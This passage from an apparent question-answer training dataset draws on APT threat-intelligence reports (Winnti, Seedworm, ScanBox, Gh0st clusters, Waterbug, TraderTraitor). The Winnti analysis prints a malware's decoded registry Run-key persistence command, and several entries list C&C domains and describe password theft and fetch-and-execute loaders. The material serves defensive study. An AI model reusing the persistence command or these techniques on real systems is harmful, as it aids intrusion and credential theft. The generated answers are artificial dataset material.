Simplified.\nThe file creates three long binary data registry keys, two of which are encrypted executable modules and one encrypted config from the body of the original dropper. These values are encrypted with simple 1-byte XOR.\nDecrypted sysinfo config contents\nSysinfo config module is used by sysbin01. Apparently it starts with the company name and has three domain names, one of which is most likely used to check Internet connectivity (update.microsoft.com).\nSysbin01 module is a loader component. It creates several threads running various jobs.\nSysbin01.thread#1 attempts to load %TEMP%\\<ComputerName>.ax file and decrypts it.\n<ComputerName>.ax file structure\nWe  checked the system but couldn't find <ComputerName>.ax file in the Temp folder of the user, however we found other .ax-files that seemed to be related because of the date of file creation.\nFile name: C:\\Documents and Settings\\%User%\\Local Settings\\Temp\\%ComputerName%_p.ax\nFile size: 2660\nCreation time (UTC): 2012-09-06 06:22:42\nMD5: unavailable (the system went offline before we discovered the filepath).\nFile name: C:\\Documents and Settings\\%User%\\Local Settings\\Temp\\uid.ax\nFile size: 16\nCreation time (UTC): 2012-09-06 05:03:06\nMD5: unavailable (the system went offline before we discovered the filepath).\nAccording to the code that loads <ComputerName>.ax it is an encrypted executable file, which is decrypted and loaded to memory by own loader routine in the sysbin01 module.\nSysbin01.thread#2 spawns a new instance of Sysbin01.thread#3 every 10 seconds during, that is done 3 times.\nSysbin01.thread#3\nThis thread is the most important. It reads the configuration from the registry and connects to the C&C servers specified in the config via direct tcp connection or via proxy that is fetched from the the settings of locally logged in user profile. The config had the following C&C: tank.hja63.com. It sends a \"POST /<HEXNUMBER>\" request with User-Agent \"lynx\", the data after HTTP header is just \"AA\", expected answer is also \"AA\".\nThis thread also creates %TEMP%\\uid.ax and stores current system unique ID, which is generated by CoCreateGuid system API (16 bytes). It is able to receive and save data from the C&C server to a file. It also monitors windows of explorer.exe and copies textual data from password fields if the user types in, stolen data is saved to a file first.\nAfter all threads are launched, the main thread waits for termination of Sysbin01.thread#3, which is created first and then exits.\nsysbin02 module behaviors depends on currently running processes. There is an embedded DLL file according to Figure 15 in sysbin02.\nIf the system has a running process named \"360tray.exe\", then the embedded file is stored in %SYSTEM%\\MFC42LOC.DLL, then copies the source executable (FlashUpdate.exe) to %TEMP%\\Flash.tmp and runs a new process from that location via WMI Win32_Process.Create method.\nIf the system has a running process named \"bdagent.exe\", then it copies the source executable (FlashUpdate.exe) to %TEMP%\\Flash.tmp, decodes an embedded Base64 string and executes. The string has the following text after decoding:\nreg add \"HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v FlashUpdate /t REG_EXPAND_SZ /d \"\"\"\"%APPDATA%\\FlashUpdate.exe\"\"\" -update activex\" /f\nThe module also saves current module file path to the registry in the following key location:\nHKCU\\Software\\Classes\\path\nNext it patches the tmp file with two dword \"AAAA\" values which looks like corruption of embedded encrypted sysbin modules inside. The meaning of this action is currently unclear.\nThen it moves Flash.tmp file to FlashUpdate.exe by and starts a new process from new location.\nFinally, if there is not \"qqpctray.exe\" process running, and this seemed to be the case for the analyzed system, it copies the source executable (FlashUpdate.exe) to %TEMP%\\Flash.tmp, patches the new file and increases its size by adding system explorer.exe file contents to the resource section \"RC Data\" 20 times. The purpose of this is to make the new executable look like the real update service of Adobe Flash, it simply stuffs the file with executable code of another application. Then it moves the file to new location %APPDATA%\\FlashUpdate.exe, saves new module file path to the registry in the following key location: HKCU\\Software\\Classes\\path and starts a new process from there.\nSmall Headline: Summary\nc_20100.NLS works in two modes. The first mode is a load as a dynamic library and the second is a launch as a service. Both branches have the same core functionality.\nThis module is a universal executable code loader with no embedded payload. Its main purpose is to connect to the C&C server, download and store the encrypted payload in the system registry. It is also responsible for loading, decrypting and running the payload module from the registry after system restart.\n\nWhat measures did the Winnti group take to obfuscate their activities and avoid detection? How did they ensure their malware remained undetected by antivirus software?",
    "output": "The Winnti group took several measures to obfuscate their activities and avoid detection. They used a dropper application that created encrypted registry keys, making it difficult for antivirus software to detect the malicious payload. The sysbin01 module read configuration data from the registry and connected to the C&C server using direct TCP connections or proxies, minimizing the risk of detection. The sysbin02 module behaved differently based on running processes, copying the source executable to different locations and patching it to avoid detection. For example, if the system had a running process named 'bdagent.exe', the module added a Base64 string to the registry to ensure persistence. Additionally, the module increased the size of the executable by adding system explorer.exe file contents to the resource section, making the new executable look like a legitimate update service.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: What methods did Seedworm use to gain access to victims' networks and perform lateral movement in the case study from April to June 2019?",
    "output": "Seedworm used phishing emails with attached Microsoft Word documents containing malicious macros to gain access to victims' networks. Upon compromising a target system by installing the Powermud v2 backdoor, Seedworm ran a tool to steal passwords saved in users' web browsers and email. They also used open-source tools such as LaZagne and Crackmapexec to obtain Windows authorization credentials. For lateral movement, Seedworm employed a vulnerability scanner to search for Microsoft Server Message Block (SMB) remote code execution vulnerabilities on other computers in the compromised subnet, as described in security update MS17-010.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: 2. Updates to the ScanBox Framework\nFollowing on from our previous post on ScanBox1, we have watched the clusters of activity outlined with close interest, as well as keeping an eye on new adopters of the ScanBox framework.\nFor those who didn't read our last entry on the framework, nor the excellent work by Jaime Blasco2 which preceded it, ScanBox is a framework written in JavaScript and PHP which allows an attacker to perform reconnaissance and key logging of visitors to compromised websites without requiring any malware to be downloaded or installed.\nThe framework has remained in use since initial analyses were published, and further analysis of the code, public reporting, as well as the infrastructure used to host ScanBox infections has given us a better picture of some of the clusters of activity we identified in our earlier blog.\nMedium Headline: Software checks\nIn cases where the attackers have included software checks within their ScanBox code, it tends to be for the same original list of filenames (Appendix C). In some cases the attackers customise the list, presumably based on the things they're expecting to find. For example, adding or removing additional security products based on the predominant software providers in their target region.\nIt's also worth noting that the standard list includes quite a lot of software which is less relevant to security (examples include WinRAR, iTunes and WinZip). Some of these may be included in order to help the attackers to try and identify real victims vs researchers/sandboxes/honeypots. An example list is shown in the following screenshot:\n1 http://pwc.blogs.com/cyber_security_updates/2014/10/scanbox-framework-whos-affected-and-whos-using-it1.html\n2 https://www.alienvault.com/open-threat-exchange/blog/scanbox-a-reconnaissance-framework-used-on-watering-hole-attacks\nMedium Headline: checkFolders\nThey do not check files directly either, instead, checking for the presence of a list of folder names:\nIn this case, rather than determining what security software is present, this check would mainly be useful in assisting the attacker with identifying the victim's operating system. This could then be used to tailor future attacks (i.e. should I deploy malware which can bypass UAC? Should I send malicious documents targeting CVE-2012-0158 or not?).\nAlso, bizarrely the attackers check the path 'Program Files (x80236)' \u2013 if anyone knows what this corresponds to, please get in touch and let us know.\nMedium Headline: Avoiding analysis?\nAs we stated earlier, some of the features of the original ScanBox code were probably designed to help those analysing results distinguish between honeypots/analysis environments and real-world victims. The newly added variables include:\n\uf0b7 colorDepth \u2013 This may help to identify virtual machines which are typically configured with specific graphics options.\n\uf0b7 Local Time on the machine \u2013 checking that the local time on the machine matches the expected time given the geo-location of the infected IP address \u2013 in many cases analysis environments are not configured with the correct time.\nMedium Headline: Updates to evade signatures\nPossibly in response to our previous report, we've seen some of the groups using ScanBox alter the content of the modules to evade detection. Attackers do read reports, both to help them attack3 and also to evade detection.\nOne change has been the URI formats used to deliver stolen key log data from obvious URLs such as:\nTo more subtle URLs such as:\nWe also note that following our release of a signature to detect the phrase \u2022No Java or Disable\u2022, which was present in a number of related frameworks, some of the attackers have now changed this to \"No or Disable\".\n3 For example as in http://pwc.blogs.com/cyber_security_updates/2015/01/destructive-malware.html\nMedium Headline: Flash Cluster (aka Cluster 1)\nThe recently published FBI flash alert #A-000049-MW4, cited domain names previously referenced in our blog as being related to an actor known as Deep Panda, which we'll get to in a minute. The link appears to have been made from the use of the DerUsbi malware family though, which we know to be used by several espionage actors.\nWhat is interesting is the potential overlap between the target selection of this cluster and the targets of those behind the recently reported Forbes compromise5,6.\nChecking the Google SafeBrowsing results for *.googlecaches.com, shows that the domain was used for distribution of malicious code for a significant period after our previous blog entry:\nThis includes distribution via gokbayrak.com. Looking at whether any other domains or IP addresses were observed delivering malicious software via gokbayrak.com shows that it was also observed delivering malware via 88.80.190[.]133. This is the same IP address that was cited in iSight's reporting of the Forbes breach.\n4 http://krebsonsecurity.com/wp-content/uploads/2015/02/fbi-pandaflash.png\n5 http://www.invincea.com/2015/02/chinese-espionage-campaign-compromises-forbes/\n6 http://www.isightpartners.com/2015/02/codoso/\nIn fact, the IP address 88.80.190.133 was involved in the compromise of the same 3 websites as SafeBrowsing shows were affected by googlecaches.com.\nThe same three sites targeted with the 0-day used in the Forbes attack were also observed distributing malware via googlecaches[.]com -we therefore believe it's likely that the group we previously described as 'Cluster 1' was behind the Forbes compromise.\nWe can use similar techniques to explore other actors who have the same tasking as Cluster 1. In the screenshot of websites delivering malware via gokbayrak.com, we saw that the domain name macanna.com[.]tw was also used to distribute malware from this page.\nWhilst macanna.com[.]tw appears to be a legitimate site, it has also been observed as being a command and control destination for malware. The malware sample in question has a hash of 3b8d7732de3b3c8823d241e7cd3185c4. The same sample also communicates with happynewyear.dns04[.]com, which in turn resolves to the IP address 115.23.172[.]151, which hosts a large number of other malicious host names:\nThese following hostnames are activity associated with the actor best known as TH3Bug? -named after their choice of Poison Ivy password. Their malware samples are present in the same cluster:\n7 http://researchcenter.paloaltonetworks.com/2014/09/recent-watering-hole-attacks-attributed-apt-group-th3bug\u00adusing-poison-ivy/\nMedium Headline: Deep Cluster (aka Cluster 2, centred on news.foundationssl[.]com)\nThis cluster relates to the threat actor referred to as Deep Panda by CrowdStrike, as was confirmed in a recent blog post8. In turn, this is widely believed to relate to the incident at Anthem, as described in a Krebs post9.\nThe graph below shows the links between the we11point.com domain name, and news.foundationssl[.]com as seen on the CrowdStrike blogpost:\nThe Krebs article also points toward other possible (although not explicit) links between the domain allegedly used in the Anthem hack (we11point.com) to Cluster 2 through shared WHOIS details, as we11point.com was registered by domain re-seller 'li2384826402@yahoo.com'\nOn its own, this would not be sufficient to associate the two clusters, but it is useful to note as a 'softer' overlap.\n8 blog.crowdstrike.com/ironman-deep-panda-uses-sakula-malware-target-organizations-multiple-sectors/\n9 http://krebsonsecurity.com/2015/02/anthem-breach-may-have-started-in-april-2014/\nMedium Headline: Digital Quartermastering\nIn their 2013 paper 'From Quartermaster to Sunshop'11, FireEye described the concept of a Digital Quartermaster, a kind of malware supply chain for intrusions, where a skilled team would develop toolsets for a range of attackers who deploy them. The shared use of ScanBox may match up quite well to this hypothesis, and indeed even to some extent the naming schema overlaps, as iSight refer to the actor behind the Forbes breach as Codoso, but suggest they are publically known as 'Sunshop'. In all likelihood this relates to a series of blogs byFireEye which refer to a series of web compromises in 2013 as being the SunShop12 campaign.\nAlthough we did not notice the correlation immediately, there is good overlap between the groups we've described above, and the clusters of activity described as sharing a Flash 0-day in early 2014 by Symantec13. Although other groups have since begun using the framework, the first groups to use the framework (clusters 1-4) correspond quite nicely to the existing Symantec blog. For reference, we've overlaid our ScanBox clusters against the likely clusters Symantec created behind the scenes for their blog, as well as other popular names:\n10 http://www.slideshare.net/CrowdStrike/crowd-casts-monthly-you-have-an-adversary-problem\n11 https://www.fireeye.com/content/dam/legacy/resources/pdfs/fireeye-malware-supply-chain.pdf\n12 https://www.fireeye.com/blog/threat-research/2013/05/ready-for-summer-the-sunshop-campaign.html\n13 http://www.symantec.com/connect/blogs/how-elderwood-platform-fueling-2014-s-zero-day-attacks\nPlease note that each vendor has their own way of grouping activity together, so these mappings are given on a best efforts basis.\nQ: How does the ScanBox framework perform reconnaissance and keylogging without requiring malware installation, and what are some of the software checks it includes?",
    "output": "The ScanBox framework is written in JavaScript and PHP, allowing it to perform reconnaissance and keylogging on visitors to compromised websites without needing any malware to be downloaded or installed. The framework includes software checks for various filenames, such as security products and other less relevant software like WinRAR, iTunes, and WinZip. These checks help attackers distinguish between real victims and researchers/sandboxes/honeypots.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Cluster: PCRat\nThis cluster contains 25 samples, and is linked with the HEART cluster (see HEART), the 7hero cluster (see 7hero) as well as the main Gh0st cluster through the common C&C at tajs.3322.org. It is also linked to the Winds cluster through common C&C at mstsc5.3322.org.\nPCRat samples have been documented used against Uyghur groups (11).\nIt is debatable how valid the PCRat connections are. There is apparently a commercially available modification of Gh0st rat called PCRat, which we have not yet seen copies of. If that kit uses the PCRat magic tag as there is reason to suspect, this cluster is of little value.\nBig Headline: Cluster: World\nThe World cluster consists of seven samples.\nSamples in this cluster all give the impression that they use hardcoded IP addresses for their C&C communication. This is because the real C&C ip is not stored in the executable, but exists base64 encoded in a text file downloaded from a remote site. Thus these files are shown with two C&C connections.\nThis cluster does not seem linked with other clusters. However, there is a strong resemblance between these samples and some samples in the Wangz cluster (e.g. c577b5a8d07982a2c6c42a7352c0cef8).\nBig Headline: Conclusions\nThis study shows the presence of several logical links between different Ghost campaigns: Links between malware type (in this case illustrated by the network protocol magic tag), links in the C&C infrastructure and to some extent links in the registration information.\nDue to the necessary scope limitation, many other links had to remain unexamined. However, the present work shows that some of the most active and prolific malware campaigns share enough connections indicate that the same groups or individuals are involved.\nIn the cases where we have been able to say something about the entities responsible for the attacks, it seems apparent that the persons involved can be considered career criminals. These are people that have their hand in many different types of online crime, have been doing it for quite some time, and often target victims inside China itself.\nSmaller clusters are in many ways more interesting. They are often more difficult to track, as they obviously leave less clues as to who is behind the attack and what the purpose is. Clusters that have been involved in targeted attacks typically belong to these.\nBig Headline: References\n1. Wikipedia. GhostNet. Wikipedia. [Online] http://en.wikipedia.org/wiki/GhostNet.\n2. Clean-MX. wt1888.com. Clean-MX domain search. [Online] http://support.clean-mx.de/clean-mx/viruses.php?domain=wt1888.com.\n3. Clean-MX. 81266966.com. Clean-MX domain search. [Online] http://support.clean-mx.de/clean-mx/viruses.php?domain=81266966.com.\n4. beishan.info. [Online] http://bbs.beishan.info/thread-849-1-1.html.\n5. cyberpolice.cn. Nanchang Cyberpolice. [Online] http://www.nanchang.cyberpolice.cn/show_news.asp?ID=1160.\n6. Blasco, Jaime. Targeted attacks against Tibet organizations. AlienVault Labs. [Online] http://labs.alienvault.com/labs/index.php/2012/targeted-attacks-against-tibet-organizations/.\n7. Villeneuve, Nart. The Significance of the \"Nitro\" Attacks. Trend Micro. [Online] http://blog.trendmicro.com/the-significance-of-the-nitro-attacks/.\n8. Command Five Pty Ltd. Command and Control in the Fifth Domain. [Online] http://www.commandfive.com/papers/C5_APT_C2InTheFifthDomain.pdf.\n9. University of Toronto. Recent Observations in Tibet-Related Information Operations: Advanced Social Engineering for the Distribution of LURK Malware. Citizen Lab. [Online] https://citizenlab.org/wp-content/uploads/2012/07/10-2012-recentobservationsintibet.pdf.\n10. Walton, Greg. Tibetan journalists targeted by Gh0stRAT in Protest pictures.rar. MalwareLab. [Online] https://malwarelab.zendesk.com/entries/21199507-tibetan-journalists-targeted-by-gh0strat-in-protest-pictures-rar.\n11. Blasco, Jaime. New MaControl variant targeting Uyghur users, the Windows version using Gh0st RAT. AlienVault Labs. [Online] http://labs.alienvault.com/labs/index.php/2012/new-macontrol-variant-targeting-uyghur-users-the-windows-version-using-gh0st-rat/.\n12. Giuliani, Gianluca og Sharf, Elad. Nepalese government websites compromised to serve Zegost RAT . Websense Security Labs Blog. [Online] http://community.websense.com/blogs/securitylabs/archive/2012/08/08/nepalese-government-websites-compromised-to-serve-zegost-backdoor.aspx.\n\nQ: What unique characteristics distinguish the World cluster within the Gh0st RAT campaigns, and how do these characteristics impact the analysis and detection of these threats?",
    "output": "A: The World cluster consists of seven samples that appear to use hardcoded IP addresses for their C&C communication. However, the real C&C IP is not stored in the executable but exists base64 encoded in a text file downloaded from a remote site, leading to two C&C connections being displayed. This cluster does not seem linked with other clusters but shares a strong resemblance with some samples in the Wangz cluster. The use of base64 encoding and remote text files for C&C IPs makes the analysis and detection of these threats more challenging, as the actual C&C IP is not immediately visible within the malware sample itself.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Medium Headline: Registration Information\nThe domain 'duamlive.com' was registered on 21 May\t 2011. It was registered by\t a 'Guangming\t Wang'.\t There is a large number of\t domain registrations (approximately\t 400) associated with 'Guangming Wang',\t possibly indicating that\t the domains were registered by an intermediary.\nThe domain 'alyac.org' was registered on 24 September 2010.\t The domain registration information is\t almost identical to that\t of\t the legitimate ESTsoft domain 'alyac.com'.\t The domain is not,\t however,\t associated\t with\t the ALYac antivirus software and does not appear to be associated with\t ESTsoft at\t all.\t The title of the website previously\t hosted at 'alyac.org' was associated with finance, insurance and\t cell phones and\t not antivirus software45 .\nAt\t the time of writing, the malicious domain 'alyac.org' points to the Google IP\t address 8.8.8.8 but\t previously\t pointed to\t South Korean IP\t address 222.122.20.241.\t Other probable malicious domains following\t a similar pattern to\t 'alyac.org' (whereby\t they\t disguise themselves as being\t associated\t with legitimate software companies) have also\t pointed\t to the same South\t Korean IP address.\t These include the domains 'trendmicros.net', 'nprotects.org' and 'bomuls.com'.\nThe domain 'trendmicros.net' was purportedly\t registered by Trend Micro\t Inc.\t The registration details are almost identical to\t that of the legitimate domain 'trendmicro.com'.\t The domain,\t however,\t appears to\t have nothing\t to do\t with\t the security company.\t The malicious domain 'nprotects.org' is similar to\t that of\t the legitimate security\t company\nnProtect ('nprotect.com') but again, does not appear to\t be associated\t with the company.\t The domain has previously\t been associated\t with malware known as 'Trojan.Win32.Generic' 46 .\t Similarly\t the domain 'bomuls.com' is not dissimilar to that of the legitimate software company\t whose website resides at 'bomul.com'. (ETnews,\t2011)\n43 The malware could use a similar technique to software such\t as iodine. (Kryo, 2010)\n44 The TTL of a domain in a DNS record\t refers to the duration for which\t the DNS result\t can be cached.\n45 A webpage previously hosted at 'alyac.org' had a title of 'Cash Advance |\t Debt Consolidation |\t Insurance | Free Credit Report | Cell Phones at alyac.org'. (Domain Tools, LLC, 2011)\nThe domains referenced above are summarised in Table 1.\n* Indicates\t IP address assigned at time of writing.\nTABLE 1 \u00adSUMMARY OF REFERENCED DOMAINS\nThe domain 'diggfunny.com' was registered\t on 14 April 2011 by a 'Lee Cooper'.\t The same registrant details were used\t to register several other domains.\t These domains include 'edsplan.com', 'ezxsoft.com', 'finalcover.com',\t 'mindplat.com',\t 'projectxz.com',\t and 'soucesp.com' \u00adall of which were registered on 14\t April 2011. The domains 'daumfan.com' and 'natefan.com' were also\t registered by 'Lee Cooper',\t but\t on 25 July\t 2011, the day\t before the hacking operation against\t the Nate and CyWorld\t user databases. The same registrant details were purportedly\t used to register an additional seven domains.\t Each\t of\t these domains has a TTL of\t 30\t minutes.\t (Domain Tools,\t LLC,\t 2011)\nAt\t the time of writing none of the above domains registered\t by 'Lee Cooper' point to\t a malicious IP address.\t The domain 'natefan.com' points to\t the Google IP\t address 8.8.8.8, 'daumfan.com' points to\t the Enom\t Inc47 IP\t address 8.5.1.42, 'finalcover.com' points to the private IP address 192.168.10.132 and\t none of\t 'diggfunny.com', 'ezxsoft.com', 'edsplan.com',\t 'mindplat.com', 'projectxz.com' or 'soucesp.com' currently\t point\t to\t an IP address.\t This suggests the domains are not\t currently in use,\t however,\t at least\t one subdomain appears to\t be in current use as shown in Table 2.\n46 Malware detected\t as\t 'Trojan.Win32.Generic'\t in May 2011 used the callback\tdomain 'pc.nprotects.org'. (GFI SandBox, 2011)\n47 Enom Inc is\t a legitimate domain name registrar used\t by the attackers\t to register domain names and\talso to host webpages.\n* Indicates\t IP address assigned at time of writing.\nTABLE 2 \u00adDOMAINS REGISTERED BY LEE COOPER\nSeveral of the domains registered by 'Lee Cooper' previously\t pointed\t to webpages.\t The domain 'mindplat.com' previously\t pointed\t to an Enom Inc. server which\t hosted its webpage. The title and\t meta description of\t the 'mindplat.com' website is\t almost\t identical to that of\t the 'alyac.org' website. Both\t websites follow the template shown in Figure 3.\t The same template has also\t been used for several other webpages and may merely\t be a template provided by a service provider used\t by\t the registrants.\nThe domains 'natefan.com' and 'projectxz.com' also\t previously\t pointed to webpages. The webpages were similar to\t the 'mindplat.com' and\t 'alyac.org' webpages but with different text.\t Again, these webpages use the same template as other webpages and\t may\t merely\t be provided\t by\t a service provider. The presence of\t these webpages may\t indicate an attempt\t by\t the attackers to\t make the malicious domains appear more legitimate.\nBig Headline: SIMILARITIES TO OTHER MALWARE\nAs previously\t discussed,\t the domain 'ro.diggfunny.com' is\t associated\t with\t malicious activity. The domains 'cache.mindplat.com' and 'bbs.ezxsoft.com' are also\t known to\t be associated\t with malware. The first\t is listed\t as a malicious domain48 and\t the second\t was used\t as a callback domain by\t malware known as 'Trojan.Win32.AgentBypass' 49 .\t The domain 'bbs.ezxsoft.com' also\t previously\t pointed to the same South\t Korean IP\t address as 'update.alyac.org' (IP\t address 202.30.224.240), further linking\t it\t to the attackers responsible for the hack into SK Communications.\nEven if\t ignoring\t the connection they both\t have to\t the domain 'alyac.org',\t the two\t pieces of malware named 'Trojan.Win32.Generic' and\t 'Trojan.Win32.AgentBypass' respectively (earlier referenced) are still linked. Both\t pieces of malware create a uniquely\t named directory50 ,\t as do\t at least\t three other pieces of\t malware (summarised\t in Annex\t B).\t This\t further links the domains 'nprotects.org' and\t 'ezxsoft.com', and\t suggests this malware, along\t with the callback domains,\t may be part\t of\t a broader,\t concerted\t effort\t by the same attackers.\n48 The domain 'cache.mindplat.com'\t is\t listed\t alongside 'ro.diggfunny.com'\t in a list of malicious\t web addresses. (CEOinIRVINE 2011).\n49 Malware detected\t as\t 'Trojan.Win32.AgentBypass'\t in mid July 2011 used the callback domain 'bbs.ezxsoft.com'. (GFI SandBox 2011)\n50 Malware analysis reports indicate both\t pieces\t of malware create a directory named\t '03a075fb70d5d675f9dc26fc'\t inside the system directory and\t a subdirectory named\t 'update'. (GFI SandBox 2011) (GFI SandBox, 2011)\nAnswer this question: What role did the domain 'alyac.org' play in the SK Communications intrusion, and how was its use indicative of a broader malicious campaign?",
    "output": "The domain 'alyac.org' was registered to look like a legitimate ESTsoft domain but was actually used for malicious purposes. At the time of writing, it pointed to the Google IP address 8.8.8.8 but previously pointed to a South Korean IP address that was also used by other probable malicious domains like 'trendmicros.net', 'nprotects.org', and 'bomuls.com'. These domains followed a similar pattern of disguising themselves as legitimate software companies. The use of 'alyac.org' and its association with other malicious domains indicated a broader, coordinated effort by the attackers to carry out multiple intrusions.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Retooled\nWaterbug's most recent campaigns have involved a swath of new tools including custom malware, modified versions of publicly available hacking tools, and legitimate administration tools. The group has also followed the current shift towards \"living off the land,\" making use of PowerShell scripts and PsExec, a Microsoft Sysinternals tool used for executing processes on other systems.\nAside from new tools already mentioned above, Waterbug has also deployed:\nA new custom dropper typically used to install Neptun as a service.\nA custom hacking tool that combines four leaked Equation Group tools (EternalBlue, EternalRomance, DoublePulsar, SMBTouch) into a single executable.\nA USB data collecting tool that checks for a connected USB drive and steals certain file types, encrypting them into a RAR file. It then uses WebDAV to upload to a Box cloud drive.\nVisual Basic scripts that perform system reconnaissance after initial infection and then send information to Waterbug command and control (C&C) servers.\nPowerShell scripts that perform system reconnaissance and credential theft from Windows Credential Manager and then send this information back to Waterbug C&Cs.\nPublicly available tools such as IntelliAdmin to execute RPC commands, SScan and NBTScan for network reconnaissance, PsExec for execution and lateral movement, and Mimikatz () for credential theft, and Certutil.exe to download and decode remote files. These tools were identified being downloaded via Waterbug tools or infrastructure.\nBig Headline: Victims\nThese three recent Waterbug campaigns have seen the group compromise governments and international organizations across the globe in addition to targets in the IT and education sectors. Since early 2018, Waterbug has attacked 13 organizations across 10 different countries:\nThe Ministry of Foreign Affairs of a Latin American country\nThe Ministry of Foreign Affairs of a Middle Eastern country\nThe Ministry of Foreign Affairs of a European country\nThe Ministry of the Interior of a South Asian country\nTwo unidentified government organizations in a Middle Eastern country\nOne unidentified government organization in a Southeast Asian country\nA government office of a South Asian country based in another country\nAn information and communications technology organization in a Middle Eastern country\nTwo information and communications technology organizations in two European countries\nAn information and communications technology organization in a South Asian country\nA multinational organization in a Middle Eastern country\nAn educational institution in a South Asian country\nBig Headline: Hijacked infrastructure\nOne of the most interesting things to occur during one of Waterbug's recent campaigns was that during an attack against one target in the Middle East, Waterbug appeared to hijack infrastructure from the Crambus espionage group and used it to deliver malware on to the victim's network. Press reports have linked Crambus and Waterbug to different nation states. While it is possible that the two groups may have been collaborating, Symantec has found no further evidence to support this. In all likelihood, Waterbug's use of Crambus infrastructure appears to have been a hostile takeover. Curiously though, Waterbug also compromised other computers on the victim's network using its own infrastructure.\nDuring this attack, a customized variant of the publicly available hacking tool Mimikatz was downloaded to a computer on the victim's network from known Crambus-controlled network infrastructure. Mimikatz was downloaded via the Powruner tool and the Poison Frog control panel. Both the infrastructure and the Powruner tool have been publicly tied to Crambus by a number of vendors. Both were also mentioned in recent leaks of documents tied to Crambus.\nSymantec believes that the variant of Mimikatz used in this attack is unique to Waterbug. It was heavily modified, with almost all original code stripped out aside from its sekurlsa::logonpasswords credential stealing feature. Waterbug has frequently made extensive modifications to publicly available tools, something Crambus is not well known for.\nThe variant of Mimikatz used was packed with a custom packing routine that has not been seen before in any non-Waterbug malware. Waterbug used this same packer on a second custom variant of Mimikatz and on a dropper for the group's custom Neuron service (). Its use in the dropper leads us to conclude that this custom packer is exclusively used by Waterbug. Additionally, this version of Mimikatz was compiled using Visual Studio and the publicly available bzip2 library which, although not unique, has been used by other Waterbug tools previously.\nAside from the attack involving Crambus infrastructure, this sample of Mimikatz has only been seen used in one other attack, against an education target in the UK in 2017. On that\noccasion, Mimikatz was dropped by a known Waterbug tool.\nIn the case of the attack against the Middle Eastern target, Crambus was the first group to compromise the victim's network, with the earliest evidence of activity dating to November 2017. The first observed evidence of Waterbug activity came on January 11, 2018, when a Waterbug-linked tool (a task scheduler named msfgi.exe) was dropped on to a computer on the victim's network. The next day, January 12, the aforementioned variant of Mimikatz was downloaded to the same computer from a known Crambus C&C server. Two further computers on the victim's network were compromised with Waterbug tools on January 12, but there is no evidence that Crambus infrastructure was used in these attacks. While one of these computers had been previously compromised by Crambus, the other showed no signs of Crambus intrusion.\nWaterbug's intrusions on the victim's network continued for much of 2018. On September 5, 2018, a similar Mimikatz variant was dropped by Waterbug's Neptun backdoor onto another computer on the network. At around the same time, other Waterbug malware was seen on the victim's network which communicated with known Waterbug C&C servers.\nFinally, the issue was clouded further by the appearance of a legitimate systems administration tool called IntelliAdmin on the victim's network. This tool is known to have been used by Crambus and was mentioned in the leak of Crambus documents. However, in\nthis case, IntelliAdmin was dropped by custom Waterbug backdoors, including the newly identified Neptun backdoor, on computers that had not been affected by the Crambus compromise.\nThe incident leaves many unanswered questions, chiefly relating to Waterbug's motive for using Crambus infrastructure. There are several possibilities:\n1. False flag: Waterbug to throw investigators off the scent. However, if this was a genuine attempt at a false flag operation, it begs the question of why it also used its own infrastructure to communicate with other machines on the victim's network, in addition to using tools that could be traced back to Waterbug.\n2. Means of intrusion: It is possible that Waterbug wanted to compromise the target organization, found out that Crambus had already compromised its network, and hijacked Crambus's own infrastructure as a means of gaining access. Symantec did not observe the initial access point and the close timeframe between Waterbug observed activity on the victim's network and its observed use of Crambus infrastructure suggests that Waterbug may have used the Crambus infrastructure as an initial access point.\n3. Mimikatz variant belonged to Crambus: There is a possibility that the version of Mimikatz downloaded by the Crambus infrastructure was actually developed by Crambus. However, the compilation technique and the fact that the only other occasion it was used was linked to Waterbug works against this hypothesis. The fact that Waterbug also appeared on the victim's network around the same time this version of Mimikatz was downloaded would make it an unlikely coincidence if the tool did belong to Crambus.\n4. Opportunistic sowing of confusion: If a false flag operation wasn't planned from the start, it is possible that Waterbug discovered the Crambus intrusion while preparing its attack and opportunistically used it in the hopes of sowing some confusion in the (<https://www.wired.com/story/iran-hackers-oilrig-read-my-lips/>)mind of the victim or investigators. , its Poison Frog control panel is known to be vulnerable to compromise, meaning it may have been a relatively trivial diversion on the part of Waterbug to hijack Crambus's infrastructure. A compromise conducted by one threat actor group (<https://www.virusbulletin.com/uploads/pdf/magazine/2017/VB2017-Guerrero-Saade-Raiu.pdf>)through another's infrastructure, or fourth party collections, has been .\n\nBased on the above text, answer a question. What are the implications of Waterbug's use of a custom packer for its Mimikatz variant, and how does this relate to its overall strategy of modifying publicly available tools?",
    "output": "Waterbug's use of a custom packer for its Mimikatz variant indicates a sophisticated level of modification and obfuscation to avoid detection. The custom packer, which has not been seen in any non-Waterbug malware, suggests that the group is investing significant effort into making its tools unique and harder to identify. This strategy aligns with Waterbug's overall approach of extensively modifying publicly available tools, such as stripping out almost all original code from Mimikatz except for its credential-stealing feature. By doing so, Waterbug aims to reduce the likelihood of its tools being recognized by antivirus software and security analysts, thereby increasing the effectiveness of its attacks.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How does the AlticGO variant of the TraderTraitor malware operate, and what distinguishes it from other variants like TokenAIS and CryptAIS?",
    "output": "AlticGO is a variant of the TraderTraitor malware observed packaged as Nullsoft Scriptable Install System (NSIS) Windows executables that extract an Electron application packaged for Windows. It contains a simpler version of TraderTraitor code in a function exported as UpdateCheckSync(), located in a file bundled in the app.asar archive. This function makes an HTTP request to hxxps://www.alticgo[.]com/update/ or hxxps://www.esilet[.]com/update/, and the response is written to disk and executed in a new shell using the child_process.exec() method in Node.js. Unlike newer versions of TraderTraitor, AlticGO does not have a mechanism to decrypt a payload, distinguishing it from variants like TokenAIS and CryptAIS, which use AES 256 encryption in CBC or CTR mode to decrypt the payload before execution.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
